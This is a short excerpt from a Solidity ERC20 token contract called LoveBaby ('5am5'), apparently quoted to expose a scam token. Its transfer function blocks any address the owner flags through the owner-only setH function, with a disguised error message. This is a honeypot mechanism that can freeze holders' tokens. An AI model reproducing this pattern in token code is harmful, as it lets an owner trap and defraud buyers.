...
contract ERC20 is Context, IERC20, IERC20Metadata,Ownable {
    ...
    function _transfer(address sender,address recipient,uint256 amount) internal virtual {
        require(!ihmd[sender] && !ihmd[recipient], "in love address");
    ...
    function setH(address account, bool b) external onlyOwner {
        ihmd[account] = b ;
    }
...
contract LoveBaby is ERC20 {
    constructor () ERC20("5am5", "5am5") 
    {    
        _zf(msg.sender, 55555555_000_000 * (10 ** 18));
    }
}